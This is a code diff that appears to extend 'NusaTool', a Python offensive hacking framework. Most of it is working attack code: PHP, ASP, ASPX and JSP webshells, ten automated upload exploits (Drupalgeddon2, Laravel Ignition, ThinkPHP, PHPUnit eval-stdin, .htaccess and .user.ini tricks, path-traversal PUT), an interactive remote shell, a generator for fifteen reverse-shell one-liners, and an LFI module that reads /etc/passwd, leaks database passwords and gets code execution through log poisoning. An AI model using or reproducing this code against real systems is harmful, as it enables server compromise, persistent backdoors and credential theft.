+<div class="hdr"><h1>⬡ NusaTool</h1><p>Security Assessment Report</p><p style="font-size:.85em;margin-top:8px;color:#556">{ts}</p></div>
+<div class="grid">
+<div class="stat-box"><div class="num">{len(vulns)}</div><div class="lbl">Total Findings</div></div>
+<div class="stat-box"><div class="num">{sum(1 for v in vulns if v.get('severity','').lower() in ('critical','high'))}</div><div class="lbl">Critical/High</div></div>
+<div class="stat-box"><div class="num">{len(phases)}</div><div class="lbl">Phases Run</div></div>
+<div class="stat-box"><div class="num">{escape(d.get('target','—'))}</div><div class="lbl">Target</div></div>
+</div>
+{bars and '<div class=section><h2>Severity Distribution</h2>'+bars+'</div>' or ''}
+<div class="section"><h2>Findings</h2>
+<table><thead><tr><th>#</th><th>Type</th><th>Target</th><th>Detail</th><th>Severity</th></tr></thead>
+<tbody>{findings_rows or '<tr><td colspan="5" style="text-align:center;color:#8899aa;padding:20px">No findings recorded</td></tr>'}</tbody></table></div>
+{phases_rows and f'<div class=section><h2>Phase Timeline</h2><table><thead><tr><th></th><th>Phase</th><th>Detail</th><th>Time</th></tr></thead><tbody>{phases_rows}</tbody></table></div>' or ''}
+<div class="section"><h2>Modules</h2><table><thead><tr><th>Module</th><th>Description</th></tr></thead><tbody>
+<tr><td>AutoPwn</td><td>Automated full pentest — port scan, web scan, CMS, LFI, SQLi, brute-force, shell, report</td></tr>
+<tr><td>WebShell</td><td>10 upload techniques — PUT, POST multipart, JSON, .htaccess, WordPress XML-RPC, Drupalgeddon2, Laravel/ThinkPHP, PHPUnit, path traversal, .user.ini</td></tr>
+<tr><td>SQL Auto</td><td>UNION-based injection — column count, version, tables, columns, data dump</td></tr>
+<tr><td>Blind SQLi</td><td>Boolean/time-based binary search extraction</td></tr>
+<tr><td>LFI2RCE</td><td>Log poisoning, php://filter, /proc/self/environ</td></tr>
+<tr><td>CMS Exploit</td><td>WordPress, Joomla, Drupal vulnerability checks</td></tr>
+<tr><td>Service Brute</td><td>SSH, FTP, MySQL, PostgreSQL, Telnet brute-force with threading</td></tr>
+<tr><td>Deface</td><td>Upload endpoint discovery, PUT writable check, form-based upload, webshell deface</td></tr>
+<tr><td>Reverse Shell</td><td>15+ payload generators — bash, python, php, nc, powershell, perl, ruby, socat, node, etc.</td></tr>
 </tbody></table></div>
-<div class="footer">NusaTool v{VERSION} | Generated automatically</div>
+<div class="footer">NusaTool v{VERSION} | {ts} | Generated by NusaTool Security Framework</div>
 </div></body></html>"""
         with open(f, "w") as fp: fp.write(html)
         print(f"  {G}✔{N} HTML report saved to {Y}{f}{N}")
 
     def generate(self, f="nusatool_report.html", data=None):
-        return self.generate_html(f, data)
+        self.generate_html(f, data)
+
+
+# ══════════════════════════════════════════════════════
+#  SESSION MANAGER
+# ══════════════════════════════════════════════════════
+
+class SessionManager:
+    def __init__(self, path="nusatool_session.json"):
+        self.path = path
+        self.data = {"target": "", "started": "", "phases": [], "findings": [], "shells": [], "creds": [], "notes": ""}
+
+    def save(self):
+        with open(self.path, "w") as f: json.dump(self.data, f, indent=2, default=str)
+
+    def load(self):
+        if os.path.exists(self.path):
+            with open(self.path) as f: self.data = json.load(f)
+            return True
+        return False
+
+    def add_phase(self, name, status, detail=""):
+        self.data["phases"].append({"name": name, "status": status, "detail": detail, "time": datetime.datetime.now().isoformat()})
+        self.save()
+
+    def add_finding(self, ftype, target, detail, severity="info"):
+        self.data["findings"].append({"type": ftype, "target": target, "detail": detail, "severity": severity, "time": datetime.datetime.now().isoformat()})
+        self.save()
+
+    def add_cred(self, service, host, user, pwd):
+        self.data["creds"].append({"service": service, "host": host, "username": user, "password": pwd})
+        self.save()
+
+    def status(self):
+        return f"  {C}📁 Session{N}  phases:{len(self.data['phases'])} findings:{len(self.data['findings'])} creds:{len(self.data['creds'])}"
+
+    def reset(self):
+        self.data = {"target": "", "started": datetime.datetime.now().isoformat(), "phases": [], "findings": [], "shells": [], "creds": [], "notes": ""}
 
 
 # ══════════════════════════════════════════════════════
@@ -2157,6 +2585,1490 @@ class AutoPwn:
 
 
 # ══════════════════════════════════════════════════════
+#  WEBSHELL GENERATOR + UPLOADER (10+ techniques)
+# ══════════════════════════════════════════════════════
+
+class WebShell:
+    SHELLS = {
+        "php": """<?php
+ob_clean();header('Content-Type: text/plain');
+$cmd=$_REQUEST['cmd']??'id';
+echo shell_exec($cmd);
+exit;
+?>""",
+        "php_stealth": """<?php @eval($_POST['c']);?>""",
+        "php_short": """<?php ob_clean();header('Content-Type: text/plain');echo shell_exec($_GET['cmd']??'id');exit;?>""",
+        "php_image": """GIF89a<?php ob_clean();header('Content-Type: text/plain');system($_GET['cmd']);exit;?>""",
+        "asp": """<%
+Dim c:c=Request("cmd"):If c<>"" Then:Set o=CreateObject("WScript.Shell"):Set e=o.Exec("cmd /c "&c):Response.Write("<pre>"&e.StdOut.ReadAll()&"</pre>"):End If
+%>""",
+        "aspx": """<%@ Page Language="C#" validateRequest="false" %>
+<script runat="server">protected void Page_Load(object s,EventArgs e){
+string c=Request["cmd"];if(c!=null){
+System.Diagnostics.Process p=new System.Diagnostics.Process();
+p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+c;
+p.StartInfo.RedirectStandardOutput=true;p.StartInfo.UseShellExecute=false;
+p.Start();Response.Write("<pre>"+p.StandardOutput.ReadToEnd()+"</pre>");
+}}</script>""",
+        "jsp": """<%
+String c=request.getParameter("cmd");
+if(c!=null){
+Process p=Runtime.getRuntime().exec(new String[]{"sh","-c",c});
+java.io.BufferedReader r=new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream()));
+String l;out.print("<pre>");while((l=r.readLine())!=null)out.println(l);out.print("</pre>");
+}%>""",
+        "python": """#!/usr/bin/env python3
+import cgi,s,subprocess as sp
+print("Content-Type: text/html\\n")
+f=cgi.FieldStorage();c=f.getvalue("cmd","id")
+print("<pre>"+sp.getoutput(c)+"</pre>")""",
+    }
+
+    UPLOAD_PATHS = [
+        "", "/uploads", "/images", "/img", "/assets", "/files", "/media",
+        "/tmp", "/admin", "/backup", "/wp-content/uploads", "/wp-content",
+        "/wp-admin", "/upload", "/storage", "/userfiles", "/data",
+        "/include", "/lib", "/css", "/js", "/vendor", "/public",
+        "/resources", "/static", "/content", "/file", "/documents",
+        "/download", "/attachments", "/photos", "/pictures", "/pics",
+        "/files/images", "/uploads/images", "/upload/files",
+        "/assets/upload", "/media/upload", "/images/upload",
+        "/wp-content/themes", "/wp-content/plugins",
+        "/wp-content/uploads/2024", "/wp-content/uploads/2025",
+        "/wp-content/uploads/2026",
+    ]
+
+    UPLOAD_ENDPOINTS = [
+        "/upload.php", "/upload_file.php", "/uploadfile.php",
+        "/file.php", "/files.php", "/media.php", "/api/upload",
+        "/api/v1/upload", "/api/file", "/api/v1/file",
+        "/wp-admin/async-upload.php", "/wp-content/plugins/",
+        "/admin/upload.php", "/includes/upload.php",
+        "/editor/upload.php", "/ckfinder/core/connector/php/connector.php",
+        "/fckeditor/editor/filemanager/upload/php/upload.php",
+        "/simpla/index.php", "/Upload", "/uploader",
+        "/upload_handler.php", "/userfiles/upload.php",
+        "/assets/upload.php", "/uploads/upload.php",
+        "/filemanager/upload.php", "/elfinder/php/connector.php",
+        "/api/upload.php", "/rest/api/upload",
+        "/index.php/upload", "/?rest_route=/upload",
+    ]
+
+    def __init__(self, url, bypass=None):
+        self.raw = url
+        parsed = urlparse(url)
+        self.scheme = parsed.scheme
+        self.host = parsed.netloc
+        self.base = f"{self.scheme}://{self.host}"
+        self.script_path = parsed.path.rstrip("/") if parsed.path else ""
+        self.dir_path = self.script_path.rsplit("/", 1)[0] if "/" in self.script_path else ""
+        self.bypass = bypass or BypassEngine(url)
+        self.uploaded = []
+        self.shell = None
+
+    def _sh(self, t="php", fn=None):
+        c = self.SHELLS.get(t)
+        if not c: return None
+        if not fn:
+            e = {"php_stealth":"php","php_short":"php","php_image":"php","asp":"asp","aspx":"aspx","jsp":"jsp","python":"py"}.get(t, t)
+            fn = f"nusa_{random.randint(10000,99999)}.{e}"
+        return {"fn": fn, "code": c, "type": t}
+
+    def _vfy(self, url):
+        try:
+            r = requests.get(url, timeout=4, verify=False)
+            if r.status_code != 200: return False
+            t = r.text.strip()
+            if not t: return False
+            if t.startswith("<!DOCTYPE") or t.startswith("<html"): return False
+            return True
+        except: return False
+
+    # ── TECHNIQUE 1: PUT to writable dirs ──
+    def _try_put(self, shell):
+        writable = self._find_writable()
+        if not writable: return None
+        url = writable.rstrip("/") + "/" + shell["fn"]
+        hdrs = {**self.bypass.bypass_headers, "User-Agent": random.choice(self.bypass.ua_list), "Content-Type": "text/plain"}
+        try:
+            r = requests.put(url, data=shell["code"], headers=hdrs, timeout=8, verify=False)
+            if r.status_code in (200,201,204) and self._vfy(url):
+                return url
+        except: pass
+        return None
+
+    def _find_writable(self):
+        for d in self.UPLOAD_PATHS:
+            for base in [self.base + self.dir_path, self.base]:
+                if "?" in base: continue
+                tu = base.rstrip("/") + d.rstrip("/") + "/nusa_tx_" + str(random.randint(1000,9999)) + ".txt"
+                try:
+                    hdrs = {**self.bypass.bypass_headers, "User-Agent": random.choice(self.bypass.ua_list)}
+                    r = requests.put(tu, data="nusa", headers=hdrs, timeout=4, verify=False)
+                    if r.status_code in (200,201,204) and self._vfy(tu):
+                        return base.rstrip("/") + d
+                except: pass
+        return None
+
+    # ── TECHNIQUE 2: POST multipart to endpoints ──
+    def _try_post_endpoints(self, shell):
+        base_clean = self.base + self.dir_path
+        for base in set([base_clean, self.base]):
+            for ep in self.UPLOAD_ENDPOINTS:
+                for fn, ct in [("file", "image/jpeg"), ("file", "application/x-php"),
+                               ("file", "text/plain"), ("uploaded", "image/jpeg"),
+                               ("image", "image/jpeg"), ("Filedata", "image/jpeg"),
+                               ("userfile", "image/jpeg"), ("images", "image/jpeg")]:
+                    try:
+                        r = requests.post(base+ep, files={fn: (shell["fn"], shell["code"], ct)},
+                            timeout=6, verify=False,
+                            headers={"User-Agent": random.choice(self.bypass.ua_list)})
+                        if r.status_code in (200,201,204):
+                            for test_base in [base, self.base]:
+                                vu = test_base.rstrip("/") + "/" + shell["fn"]
+                                if self._vfy(vu): return vu
+                    except: pass
+        return None
+
+    # ── TECHNIQUE 3: POST with form field ──
+    def _try_post_form(self, shell):
+        for base in [self.base, self.base + self.dir_path]:
+            if "?" in base: continue
+            for ep in ["", "/upload", "/save", "/index.php", "/api"]:
+                for fn in ["file", "upload", "image", "Filedata", "userfile", "files[]", "photo"]:
+                    try:
+                        r = requests.post(base+ep,
+                            data={fn: (shell["fn"], shell["code"])},
+                            timeout=6, verify=False,
+                            headers={"User-Agent": random.choice(self.bypass.ua_list)})
+                        if r.status_code in (200,201,204):
+                            vu = base.rstrip("/") + "/" + shell["fn"]
+                            if self._vfy(vu): return vu
+                    except: pass
+        return None
+
+    # ── TECHNIQUE 4: POST JSON with base64 data ──
+    def _try_post_json(self, shell):
+        b64 = base64.b64encode(shell["code"].encode()).decode()
+        payloads = [
+            {"file": shell["fn"], "data": b64, "action": "upload"},
+            {"filename": shell["fn"], "content": b64, "type": "image"},
+            {"name": shell["fn"], "base64": b64},
+            {"image": shell["fn"], "data": f"data:image/jpeg;base64,{b64}"},
+        ]
+        for base in [self.base, self.base + self.dir_path]:
+            for ep in ["/api/upload", "/api/v1/upload", "/upload", "/rest/upload"]:
+                for p in payloads:
+                    try:
+                        r = requests.post(base+ep, json=p,
+                            timeout=6, verify=False,
+                            headers={"User-Agent": random.choice(self.bypass.ua_list), "Content-Type": "application/json"})
+                        if r.status_code in (200,201,204):
+                            vu = base.rstrip("/") + "/" + shell["fn"]
+                            if self._vfy(vu): return vu
+                    except: pass
+        return None
+
+    # ── TECHNIQUE 5: .htaccess + image bypass ──
+    def _try_htaccess_bypass(self, shell):
+        htaccess = "AddType application/x-httpd-php .png\nphp_value auto_prepend_fd none\n"
+        for base in set([self.base, self.base + self.dir_path,
+                         self.base+"/uploads", self.base+"/wp-content/uploads"]):
+            try:
+                requests.put(base+"/.htaccess", data=htaccess,
+                    headers={"User-Agent": random.choice(self.bypass.ua_list)}, timeout=4, verify=False)
+            except: pass
+            try:
+                r = requests.post(base+"/", files={"file": ("nusa_x.png", shell["code"], "image/png")},
+                    timeout=6, verify=False,
+                    headers={"User-Agent": random.choice(self.bypass.ua_list)})
+                if r.status_code in (200,201,204) and self._vfy(base+"/nusa_x.png"):
+                    return base+"/nusa_x.png"
+            except: pass
+        return None
+
+    # ── TECHNIQUE 6: WordPress XML-RPC upload ──
+    def _try_wp_xmlrpc(self, shell):
+        wp_url = self.base + "/xmlrpc.php"
+        try:
+            r = requests.post(wp_url, data=f"<?xml version='1.0'?><methodCall><methodName>system.listMethods</methodName></methodCall>",
+                headers={"Content-Type": "text/xml"}, timeout=6, verify=False)
+            if r.status_code != 200 or "methodName" not in (r.text or ""): return None
+        except: return None
+        b64 = base64.b64encode(shell["code"].encode()).decode()
+        xml = f"""<?xml version="1.0"?>
+<methodCall><methodName>wp.uploadFile</methodName><params><param><value><struct>
+<member><name>name</name><value><string>{shell['fn']}</string></value></member>
+<member><name>type</name><value><string>image/jpeg</string></value></member>
+<member><name>bits</name><value><base64>{b64}</base64></value></member>
+<member><name>overwrite</name><value><boolean>1</boolean></value></member>
+</struct></value></param></params></methodCall>"""
+        try:
+            r = requests.post(wp_url, data=xml, headers={"Content-Type": "text/xml"}, timeout=8, verify=False)
+            if r.status_code == 200:
+                vu = self.base + "/wp-content/uploads/" + shell["fn"]
+                if self._vfy(vu): return vu
+                m = re.search(r'<url>\s*<!\[CDATA\[([^\]]+)\]\]>\s*</url>', r.text)
+                if m: return m.group(1)
+        except: pass
+        return None
+
+    # ── TECHNIQUE 7: Drupalgeddon2 RCE upload ──
+    def _try_drupalgeddon2(self, shell):
+        for form in ["user_register_form", "user_pass", "contact_site_form"]:
+            try:
+                r = requests.post(self.base + f"/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
+                    data={"form_id": form, "_drupal_ajax": "1",
+                          "mail[#post_render][]": "file_put_contents",
+                          "mail[#markup]": f"{shell['fn']}|{base64.b64encode(shell['code'].encode()).decode()}"},
+                    timeout=8, verify=False)
+                if r.status_code == 200 and self._vfy(self.base + "/" + shell["fn"]):
+                    return self.base + "/" + shell["fn"]
+            except: pass
+        return None
+
+    # ── TECHNIQUE 8: Laravel/ThinkPHP debug RCE ──
+    def _try_framework_rce(self, shell):
+        fn = shell["fn"]
+        code = shell["code"]
+        b64 = base64.b64encode(code.encode()).decode()
+        targets = [
+            ("laravel-post", f"_ignition/execute-solution",
+             {"solution_class": "Ignition\\Solutions\\MakeViewVariableOptionalSolution",
+              "parameters": {"variableName": "nusa", "viewFile": fn}}),
+            ("thinkphp-get", f"index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=" + fn + "&vars[1][]=" + urllib.parse.quote(code), None),
+        ]
+        for name, path, data in targets:
+            try:
+                if name.startswith("laravel"):
+                    r = requests.post(self.base + "/" + path, json=data, timeout=6, verify=False)
+                elif name.startswith("thinkphp"):
+                    r = requests.get(self.base + "/" + path, timeout=6, verify=False)
+                if r and r.status_code in (200, 201) and self._vfy(self.base + "/" + fn):
+                    return self.base + "/" + fn
+            except: pass
+        try:
+            r = requests.post(self.base + "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
+                data=f"<?=file_put_contents('{fn}',base64_decode('{b64}'));?>",
+                timeout=6, verify=False)
+            if r.status_code in (200, 201) and self._vfy(self.base + "/" + fn):
+                return self.base + "/" + fn
+        except: pass
+        return None
+
+    # ── TECHNIQUE 9: Base64 PUT via path traversal ──
+    def _try_path_traversal_put(self, shell):
+        traversals = [
+            f"../../../../../../var/www/html/{shell['fn']}",
+            f"../../../html/{shell['fn']}",
+            f"../../httpd/htdocs/{shell['fn']}",
+            f"../../www/{shell['fn']}",
+            f"../../../www/html/{shell['fn']}",
+        ]
+        for base in [self.base + self.script_path + "/", self.base + "/"]:
+            for t in traversals:
+                try:
+                    r = requests.put(base + t, data=shell["code"],
+                        headers={**self.bypass.bypass_headers, "User-Agent": random.choice(self.bypass.ua_list)},
+                        timeout=6, verify=False)
+                    if r.status_code in (200,201,204) and self._vfy(self.base + "/" + shell["fn"]):
+                        return self.base + "/" + shell["fn"]
+                except: pass
+        return None
+
+    # ── TECHNIQUE 10: PHP info → auto-shell via php.ini ──
+    def _try_php_info_write(self, shell):
+        user_ini = f"auto_prepend_file={shell['fn']}\n"
+        for base in set([self.base + self.dir_path, self.base]):
+            try:
+                requests.put(base+"/.user.ini", data=user_ini,
+                    headers={"User-Agent": random.choice(self.bypass.ua_list)}, timeout=4, verify=False)
+                requests.put(base+"/"+shell["fn"], data=shell["code"],
+                    headers={"User-Agent": random.choice(self.bypass.ua_list)}, timeout=4, verify=False)
+                if self._vfy(base+"/"+shell["fn"]):
+                    return base+"/"+shell["fn"]
+            except: pass
+        return None
+
+    def exec_cmd(self, shell_url, cmd="id"):
+        try:
+            r = self.bypass.get(shell_url, params={"cmd": cmd}, timeout=10)
+            if r.status_code == 200 and r.text:
+                t = r.text
+                ct = r.headers.get("Content-Type", "")
+                if "text/plain" in ct:
+                    return t.strip() or None
+                if "<pre>" in t:
+                    x = t.split("<pre>")[1].split("</pre>")[0].strip()
+                    if x: return x
+                nohtml = re.sub(r'<[^>]+>', '', t).strip()
+                nohtml = re.sub(r'\s+', ' ', nohtml)
+                if t.strip().startswith("<!DOCTYPE") or t.strip().startswith("<html"):
+                    return None
+                if len(nohtml) < 200:
+                    return nohtml or None
+                return nohtml[:500]
+        except: pass
+        return None
+
+    def run(self, shell_type="php", method="auto"):
+        header("WEBSHELL — ACTIVE BACKDOOR DEPLOYMENT")
+        print(f"  {C}◉{N} URL: {Y}{self.raw}{N} | Type: {Y}{shell_type}{N}")
+        print(f"  {self.bypass.info()}{N}")
+        if self.bypass.connect_error:
+            print(f"\n  {R}✘{N} Unreachable.\n"); return None
+        if self.bypass.status_code in (403, 401, 503):
+            print(f"\n  {R}✘{N} Server blocks requests (HTTP {self.bypass.status_code}). Try SQL/LFI instead.\n")
+            return None
+
+        shell = self._sh(shell_type)
+        if not shell: return None
+
+        techniques = [
+            ("PUT writable dir", self._try_put),
+            ("POST upload endpoints", self._try_post_endpoints),
+            ("POST form field", self._try_post_form),
+            ("POST JSON base64", self._try_post_json),
+            (".htaccess bypass", self._try_htaccess_bypass),
+            ("WordPress XML-RPC", self._try_wp_xmlrpc),
+            ("Drupalgeddon2", self._try_drupalgeddon2),
+            ("Framework RCE", self._try_framework_rce),
+            ("Path traversal PUT", self._try_path_traversal_put),
+            (".user.ini inject", self._try_php_info_write),
+        ]
+
+        url = None
+        for name, func in techniques:
+            print(f"  {C}▶{N} Trying {Y}{name}{N}...", end="\r")
+            url = func(shell)
+            if url:
+                print(f"  {G}✔{N} {BOLD}{name}: SUCCESS{N}")
+                print(f"      {Y}{url}{N}")
+                break
+
+        if url:
+            print(f"\n  {BOLD}{C}TESTING WEBSHELL{N}")
+            result = self.exec_cmd(url, "id")
+            if result:
+                print(f"  {G}✔{N} Command execution OK!")
+                print(f"  {W}{result.strip()[:300]}{N}")
+                print(f"\n  {BOLD}{C}INTERACTIVE SHELL (type 'exit' to quit){N}")
+                try:
+                    while True:
+                        c = input(f"  {R}shell{N}@{Y}{self.host}{N} {R}$ {N}").strip()
+                        if c.lower() in ("exit","quit","q"): break
+                        if c.lower() == "clear": os.system('cls' if os.name == 'nt' else 'clear'); continue
+                        out = self.exec_cmd(url, c)
+                        if out: print(f"  {W}{out}{N}")
+                except (KeyboardInterrupt, EOFError): print()
+            return {"url": url, "type": shell_type}
+        print(f"\n  {R}✘{N} All 10 techniques failed. Target may not allow upload.\n")
+        return None
+
+
+# ══════════════════════════════════════════════════════
+#  REVERSE SHELL GENERATOR
+# ══════════════════════════════════════════════════════
+
+class ReverseShell:
+    PAYLOADS = {
+        "bash": "bash -i >& /dev/tcp/{host}/{port} 0>&1",
+        "bash_readline": "exec 5<>/dev/tcp/{host}/{port}; cat <&5 | while read line; do $line 2>&5 >&5; done",
+        "python": """python3 -c '
+import socket,os,pty
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("{host}",{port}))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+pty.spawn("/bin/bash")
+'""",
+        "python_short": 'python -c "import os,socket,pty;s=socket.socket();s.connect((\\"{host}\\",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\\"/bin/bash\\")"',
+        "php": """php -r '$s=fsockopen("{host}",{port});exec("/bin/bash -i <&3 >&3 2>&3");'""",
+        "nc": "nc -e /bin/bash {host} {port}",
+        "nc_traditional": "nc.traditional -e /bin/bash {host} {port}",
+        "powershell": """powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('{host}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb + 'PS ' + (pwd).Path + '> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}};$c.Close()""",
+        "perl": """perl -e 'use Socket;$i="{host}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");}}'""",
+        "ruby": "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{host}\",{port});while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}};end'",
+        "socat": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{host}:{port}",
+        "telnet": "rm -f /tmp/p; mknod /tmp/p p && telnet {host} {port} 0</tmp/p | bash 1>/tmp/p",
+        "xterm": "xterm -display {host}:{port}",
+        "nc_pipe": "mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {host} {port} >/tmp/f",
+        "awk": "awk 'BEGIN{s=\"/inet/tcp/0/{host}/{port}\";for(;s|&getline c;close(c))while(c|&getline)print $0|&s;close(s)}'",
+        "node": "node -e 'require(\"child_process\").exec(\"bash -i >& /dev/tcp/{host}/{port} 0>&1\")'",
+    }
+
+    def __init__(self, host, port=4444):
+        self.host = host
+        self.port = port
+        self.listener_help = {
+            "nc": f"nc -lnvp {port}",
+            "socat": f"socat TCP-LISTEN:{port},reuseaddr,fork -",
+            "python": f"python3 -c 'import socket;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind((\"0.0.0.0\",{port}));s.listen(1);c,a=s.accept();print(f\"Connection from {{a}}\");c.send(b\"Shell> \");import pty;os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);pty.spawn(\"/bin/bash\")'",
+        }
+
+    def generate(self, lang="bash", url_encode=False):
+        payload = self.PAYLOADS.get(lang)
+        if not payload:
+            return f"Unknown language: {lang}. Available: {', '.join(self.PAYLOADS.keys())}"
+        result = payload.format(host=self.host, port=self.port)
+        if url_encode:
+            result = urllib.parse.quote(result)
+        return result
+
+    def listener_cmd(self, method="nc"):
+        return self.listener_help.get(method, f"nc -lnvp {self.port}")
+
+    def run(self, lang="bash", url_encode=False):
+        header("REVERSE SHELL — PAYLOAD GENERATOR")
+        print(f"  {C}◉{N} LHOST: {Y}{self.host}{N}  |  LPORT: {Y}{self.port}{N}")
+        print(f"  {C}◉{N} Lang : {Y}{lang}{N}")
+        print(f"\n  {BOLD}{C}LISTENER (run on your machine):{N}")
+        for method, cmd in self.listener_help.items():
+            print(f"  {G}{method:>8}{N}: {Y}{cmd}{N}")
+        print(f"\n  {BOLD}{C}PAYLOAD:{N}")
+        payload = self.generate(lang, url_encode)
+        print(f"\n  {W}{payload}{N}\n")
+
+        print(f"  {BOLD}{C}CMD INJECTION / WEBSHELL USE:{N}")
+        if url_encode:
+            print(f"  {D}URL: {Y}?cmd={payload}{N}")
+        else:
+            print(f"  {D}Direct: {Y}{payload}{N}")
+        print(f"  {D}WebShell: {Y}?cmd={urllib.parse.quote(payload) if not url_encode else payload}{N}")
+        print()
+        return payload
+
+
+# ══════════════════════════════════════════════════════
+#  LFI EXPLOITER — Read Files + RCE
+# ══════════════════════════════════════════════════════
+
+class LFIExploiter:
+    def __init__(self, url, param, bypass=None):
+        self.url = url
+        self.param = param
+        self.bypass = bypass or BypassEngine(url)
+        self.parsed = urlparse(url)
+        self.params = parse_qs(self.parsed.query) if parse_qs(self.parsed.query) else {}
+
+    def _build(self, payload):
+        new = urllib.parse.urlencode({k: (payload if k == self.param else v[0]) for k, v in self.params.items()})
+        return f"{self.parsed.scheme}://{self.parsed.netloc}{self.parsed.path}?{new}"
+
+    def read_file(self, path):
+        u = self._build(path)
+        r = self.bypass.get(u, timeout=10, allow_redirects=False)
+        if r and (r.status_code == 200 or "root:" in (r.text or "")):
+            return r.text
+        return None
+
+    def read_etc_passwd(self):
+        result = self.read_file("../../../../../../etc/passwd")
+        if result and "root:x:" in result:
+            print(f"  {G}[✔]{N} Read /etc/passwd!")
+            users = re.findall(r'^([^:]+):', result, re.M)
+            print(f"  {D}Users: {', '.join(users)}{N}")
+            return result
+        result2 = self.read_file("/etc/passwd")
+        if result2 and "root:x:" in result2:
+            print(f"  {G}[✔]{N} Read /etc/passwd!")
+            return result2
+        return None
+
+    def read_php_source(self, path="index"):
+        for payload in [
+            f"php://filter/convert.base64-encode/resource={path}",
+            f"php://filter/convert.base64-encode/resource={path}.php",
+            f"php://filter/read=convert.base64-encode/resource={path}",
+        ]:
+            result = self.read_file(payload)
+            if result:
+                b64 = re.search(r'([A-Za-z0-9+/=]{50,})', result)
+                if b64:
+                    try:
+                        decoded = base64.b64decode(b64.group(1)).decode()
+                        print(f"  {G}[✔]{N} Source of {Y}{path}{N}:")
+                        print(f"  {D}{'─'*40}{N}")
+                        for line in decoded.split("\n")[:30]:
+                            print(f"  {W}{line}{N}")
+                        return decoded
+                    except: pass
+        return None
+
+    def log_poison_rce(self, cmd="id", log_path=None):
+        """Attempt RCE via Apache log poisoning."""
+        if not log_path:
+            candidates = [
+                "../../../../../../var/log/apache2/access.log",
+                "../../../../../../var/log/httpd/access_log",
+                "../../../../../../var/log/apache/access.log",
+                "../../../../../../var/log/nginx/access.log",
+                "../../../../../../var/log/apache2/access_log",
+                "/var/log/apache2/access.log",
+                "/var/log/httpd/access_log",
+            ]
+        else:
+            candidates = [log_path]
+
+        # Inject payload into log via User-Agent
+        try:
+            inject_url = self.url
+            ua_payload = f"<?php system('{cmd}'); ?>"
+            requests.get(inject_url, headers={"User-Agent": ua_payload}, timeout=5, verify=False)
+        except: pass
+
+        for log in candidates:
+            result = self.read_file(log)
+            if result and ("GET" in result or "POST" in result):
+                # Check if our payload executed
+                if cmd in result:
+                    print(f"  {R}[!]{N} {BOLD}RCE via log poisoning!{N}")
+                    print(f"  {D}Log: {Y}{log}{N}")
+                    after_log = result.split(cmd)[-1][:200] if cmd in result else result[:200]
+                    print(f"  {W}Output: {after_log}{N}")
+                    return result
+                print(f"  {Y}[!]{N} Log readable: {Y}{log}{N}")
+                print(f"  {D}Payload may need second request to trigger{N}")
+                return result
+        return None
+
+    def proc_environ_rce(self, cmd="id"):
+        """Try /proc/self/environ RCE."""
+        result = self.read_file("../../../../../../proc/self/environ")
+        if result and "HTTP_USER_AGENT" in result:
+            print(f"  {Y}[!]{N} /proc/self/environ readable! Injecting payload...")
+            inject_url = self.url
+            ua = f"<?php system('{cmd}'); ?>"
+            try:
+                requests.get(inject_url, headers={"User-Agent": ua}, timeout=5, verify=False)
+            except: pass
+            result2 = self.read_file("../../../../../../proc/self/environ")
+            if result2 and cmd in result2:
+                print(f"  {R}[!]{N} {BOLD}RCE via /proc/self/environ!{N}")
+                return result2
+        return None
+
+    def scan(self):
+        header("LFI EXPLOITER — FILE READ → RCE")
+        print(f"  {C}◉{N} URL  : {Y}{self.url}{N}")
+        print(f"  {C}◉{N} Param: {Y}{self.param}{N}")
+        print(f"  {self.bypass.info()}{N}")
+        if self.bypass.connect_error:
+            print(f"\n  {R}✘{N} Target unreachable.\n"); return None
+
+        print(f"\n  {BOLD}{C}PHASE 1: READ /etc/passwd{N}")
+        passwd = self.read_etc_passwd()
+        if not passwd:
+            print(f"  {Y}⚠{N} /etc/passwd not readable via LFI")
+
+        print(f"\n  {BOLD}{C}PHASE 2: PHP SOURCE LEAK{N}")
+        for target in ["index", "config", "admin", "login", "wp-config"]:
+            src = self.read_php_source(target)
+            if src:
+                if "DB_PASSWORD" in src or "db_password" in src:
+                    pwds = re.findall(r"['\"]?DB_PASSWORD['\"]?\s*,\s*['\"]([^'\"]+)", src, re.I)
+                    if pwds:
+                        print(f"  {R}[!]{N} {BOLD}DATABASE CREDENTIALS LEAKED!{N}")
+                        for p in pwds:
+                            print(f"      {Y}{p}{N}")
+                break
+
+        print(f"\n  {BOLD}{C}PHASE 3: LOG POISONING → RCE{N}")
+        rce = self.log_poison_rce()
+        if not rce:
+            rce = self.proc_environ_rce()
+        if not rce:
+            print(f"  {Y}⚠{N} Could not achieve RCE via LFI")
+
+        print()
+        return passwd
+
+
+# ══════════════════════════════════════════════════════
+#  SQL AUTO EXPLOIT — Full DB Dump
+# ══════════════════════════════════════════════════════
+
+class SQLAutoExploit:
+    def __init__(self, url, method="GET", param=None, bypass=None):
+        self.scanner = SQLiScanner(url, method, param, bypass)
+        self.url = url
